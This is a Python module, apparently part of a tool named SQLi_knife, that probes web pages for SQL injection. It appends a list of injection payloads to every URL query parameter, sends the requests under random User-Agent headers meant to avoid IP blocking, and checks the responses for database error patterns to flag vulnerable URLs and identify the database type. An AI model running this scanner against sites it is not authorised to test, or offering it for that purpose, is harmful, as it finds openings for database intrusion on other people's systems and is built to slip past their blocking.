from urllib.parse import urlparse
import json
import re
from fake_useragent import UserAgent
import requests

"""
general purpose of this methods - check if some url is vulnerable or not
"""


#get htmp code of some webapge by url
def get_html_source(url):
    #convert url to http:// - format
    url = check_http_prefix(url)
    #create random useragent header
    header = create_random_useragent()
    #get response with requests GET
    r = requests.get(url, headers=header)

    #if resonse code is 2xx - return html code
    if str(r.status_code)[0] == '2':
        return r.content
    else:
        return False


#use fake_useragent modeule to create random useragent header
#we need useragent header to avoid blocking by IP
#However we really need PROXY to avoid blocking by IP
def create_random_useragent():
    random_useragent = UserAgent()
    header = {
        'User-Agent': str(random_useragent.random)
    }
    return header

#convert any url to http:// fomat
def check_http_prefix(url):
    if url[:4] != 'http':
        url = "http://" + url
    return url


#scan url`s. We don`t need multithreading there if we use if with one url
def scan_urls(urls,  event_VUL,  event_LOG,  event_RES):
    vulns_setected = []
    for webpage in urls:
        db = check_if_inj_possible(webpage, event_VUL,  event_LOG,  event_RES)
        if db:
            vulns_setected.append((webpage, db))
    return vulns_setected


#read json file from data/sql_errors.json
#(this file contains sql_erors in html that can be used to detect type of database and sqli)
def get_sql_errors():
    try:
        with open('SQLi_knife/data/sql_errors.json', 'r') as f:
            return json.loads(f.read())
    except Exception as e:
        print(e)


#check if some of sql_errors persists in html code
def check_html_for_sql_errors(html_page_source, sql_errors):
    """
    :param html_page_source: html code
    :param sql_errors: dictinary of SQL errors: KEY: type of DB VALUE: typical errors
    :return:
    """
    #iterate through errors dictinary
    for db_type, errors in sql_errors.items():
        #find error with regular expression. Error is a regular expression itself
        for error_type in errors:
            if re.compile(error_type).search(html_page_source.decode('utf-8')):
                return True, db_type
    return False, None


#check if url is vulnerable or not
def check_if_inj_possible(url,  event_VUL,  event_LOG,  event_RES):
    #get dict of SQL errors
    sql_errors = get_sql_errors()
    event_LOG.emit("[MSG] scanning {}".format(url))
    #get parametes
    parameters = urlparse(url).query.split("&")
    #if perameters is not empty
    if any(parameters):
        for payload in ('`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C", \
                        "'", "')", "';", '"', '")', '";', '`', '`)'):
            #create new utl with each payload and try to check is new url vulnerable
            source = get_html_source(url.split("?")[0] + "?" + ("&".join([q + payload for q in parameters])))
            #if html code exists
            if source:
                #check code for typical sql errors
                vulnerable, db = check_html_for_sql_errors(source, sql_errors)
                #return DB type is url is vulnerable
                if vulnerable and db != None:
                    event_VUL.emit("url {} is vulnerable".format(url))
                    event_RES.emit("url {} is vulnerable".format(url))
                    return db
    else:
        return False
